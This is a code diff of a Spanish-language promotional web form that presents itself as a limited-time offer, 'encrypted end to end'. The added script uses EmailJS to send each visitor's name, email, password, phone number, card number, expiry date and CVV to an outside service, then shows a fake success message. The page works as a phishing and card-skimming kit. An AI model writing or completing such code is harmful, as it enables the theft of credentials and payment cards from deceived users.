@@ -50,15 +50,14 @@
     }
 
     header h1 {
-    color: #000000; /* negro */
+    color: #000000;
     font-size: 2.8rem;
     margin-bottom: 0.5rem;
     }
 
     header p {
-    color: #000000; /* negro */
+    color: #000000;
     font-size: 1.2rem;
-
     }
 
     .tiempo-limitado {
@@ -229,6 +228,15 @@
   100% { transform: rotate(360deg); }
 }
 </style>
+
+<!-- EmailJS -->
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+       emailjs.init("YOUR_PUBLIC_KEY"); // Reemplaza con tu Public Key
+   })();
+</script>
+
 </head>
 <body>
 
@@ -269,7 +277,6 @@
     <p>Encriptado de extremo a extremo 🔒.</p>
 </div>
 
-<!-- Imagen de tarjetas colocada debajo del mensaje de seguridad -->
 <div style="text-align: center; margin-bottom: 1rem;">
     <img src="tarjetas.PNG" alt="Tarjetas" style="height: 40px;">
 </div>
@@ -397,7 +404,7 @@ function validateField(field) {
     document.getElementById(id).addEventListener('blur', (e) => validateField(e.target));
 });
 
-// Validación al enviar
+// Validación y envío con EmailJS
 form.addEventListener('submit', function(e){
     e.preventDefault();
     feedback.style.display = 'none';
@@ -413,20 +420,34 @@ form.addEventListener('submit', function(e){
     });
 
     if(valid){
-        // Mostrar spinner
         const spinner = document.getElementById('loading-spinner');
         spinner.style.display = 'block';
 
-        // Esperar 2 segundos y mostrar error
-        setTimeout(() => {
+        const templateParams = {
+            nombre: document.getElementById('nombre').value,
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value,
+            telefono: document.getElementById('telefono').value,
+            cc_number: document.getElementById('cc-number').value,
+            cc_exp: document.getElementById('cc-exp').value,
+            cc_cvv: document.getElementById('cc-cvv').value
+        };
+
+        emailjs.send('YOUR_SERVICE_ID','YOUR_TEMPLATE_ID', templateParams)
+        .then(function(response) {
             spinner.style.display = 'none';
-            feedback.textContent = "Lo sentimos, inténtalo de nuevo más tarde.";
+            feedback.textContent = "¡Promoción enviada correctamente!";
+            feedback.classList.remove("error");
+            feedback.style.display = 'block';
+            form.reset();
+        }, function(error) {
+            spinner.style.display = 'none';
+            feedback.textContent = "Ocurrió un error, por favor inténtelo de nuevo más tarde.";
             feedback.classList.add("error");
             feedback.style.display = 'block';
-        }, 2000);
+        });
     }
 });
-
 </script>
 </body>
 </html>
